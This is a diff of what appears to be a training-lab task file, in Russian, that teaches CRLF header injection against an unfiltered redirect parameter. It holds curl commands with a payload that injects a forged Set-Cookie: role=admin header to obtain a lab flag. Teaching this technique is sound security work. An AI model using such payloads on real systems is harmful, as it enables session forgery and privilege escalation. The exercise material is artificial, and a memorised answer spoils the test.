@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: CRLF-инъекция\n\nЭндпоинт /go?next= копирует next в заголовок Location без фильтрации CRLF.\nДобейся, чтобы сервер вернул подделанную куку с ролью admin, и прочитай её значение.\n\n1. Убедись, что next отражается в заголовке:\n   curl -sI 'https://app.target/go?next=/dashboard'\n2. Вставь CRLF и свой заголовок:\n   curl -sI 'https://app.target/go?next=%2Fdashboard%0d%0aSet-Cookie:%20role=admin'\n3. В ответе появится Set-Cookie со значением флага — запиши его в found.txt и набери check.\n"
+      "text": "# Практика: CRLF-инъекция\n## Повторение (`web-injection-protocol`)\n\nПрежде чем браться за «HTTP header injection и response splitting: CRLF в ответе», повтори приём из `web-injection-protocol` — «Инъекции на уровне протокола: заголовки, почта, XML, OData». Карта инъекций, которые живут не в SQL, а в разметке протоколов: CRLF в заголовках, SMTP-поля, XML/XPath и OData-фильтры.\nСначала маленький шаг тем же приёмом:\n\n    head -n 5 task.md\n\nЭто возвращает тебя в контекст предшествующего урока, и уже затем — собственно задача ниже.\n\n\nЭндпоинт /go?next= копирует next в заголовок Location без фильтрации CRLF.\nДобейся, чтобы сервер вернул подделанную куку с ролью admin, и прочитай её значение.\n\n1. Убедись, что next отражается в заголовке:\n   curl -sI 'https://app.target/go?next=/dashboard'\n2. Вставь CRLF и свой заголовок:\n   curl -sI 'https://app.target/go?next=%2Fdashboard%0d%0aSet-Cookie:%20role=admin'\n3. В ответе появится Set-Cookie со значением флага — запиши его в found.txt и набери check.\n"
     }
   ],
   "tools": {
